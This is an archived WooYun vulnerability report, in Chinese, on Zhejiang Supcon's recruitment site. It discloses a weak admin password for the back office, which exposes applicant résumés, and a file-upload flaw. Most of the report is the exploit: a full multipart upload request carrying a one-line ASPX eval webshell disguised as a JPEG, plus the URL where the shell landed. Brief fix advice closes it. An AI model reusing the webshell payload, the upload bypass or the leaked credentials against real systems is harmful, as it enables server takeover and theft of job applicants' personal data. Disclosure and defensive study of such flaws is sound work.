{"id": 67200, "wybug_id": "wooyun-2015-0144724", "wybug_title": "浙江中控某招聘网存在任意文件上传可GetShell", "wybug_corp": "浙江中控", "wybug_author": "路人甲", "wybug_date": "2015-10-04 14:49", "wybug_open_date": "2015-11-18 14:50", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-04：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-11-18：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述：  详细说明：  浙江中控招聘网http://hr.supcon.com/先提示下 这个后台管理系统存在弱口令，http://hr.supcon.com/Admin/Home/LogOn 用户名：admin 密码:888888会导致大量人员的简历信息泄露下面是任意文件上传导致恶意代码执行步骤第一步：注册个账号 演示账号888888 密码888888第二步： 找个上传的文件的地方 \n\n第三步：做个带木马的图片，上传，提示成功 \nPOST /UDocument/DocumentSave HTTP/1.1Host: hr.supcon.comConnection: keep-aliveContent-Length: 404Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://hr.supcon.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymXePhdE0Z3qj57zeReferer: http://hr.supcon.com/SocialJob/IndexPersonalAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: ASP.NET_SessionId=zfuq3l2cbaiu4n452qhv10vd; ASPSESSIONIDCCCDATQR=CHHDDFPDHPIDKIFODMPPGBMA------WebKitFormBoundarymXePhdE0Z3qj57zeContent-Disposition: form-data; name=\"Id\"default------WebKitFormBoundarymXePhdE0Z3qj57zeContent-Disposition: form-data; name=\"ExtraPic\"; filename=\"test1.aspx\"Content-Type: image/jpeg<%@ Page Language=\"Jscript\" validateRequest=\"false\" %><%Response.Write(eval(Request.Item[\"tom\"],\"unsafe\"));%>------WebKitFormBoundarymXePhdE0Z3qj57zeContent-Disposition: form-data; name=\"DocuMemo\"111------WebKitFormBoundarymXePhdE0Z3qj57ze--\n第四步：更改文件后缀用工具上传，提示成功 ，返回报文竟然有明确的地址      http://hr.supcon.com/files/Supcon2015103_269053237.aspx第五步：用木马地址连接提示成功，可执行\n\n   漏洞证明：  \n\n\n\n   修复方案：  1.弱口令加强 2.白名单方式判断文件后缀3.去掉文件目录的可执行权限   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}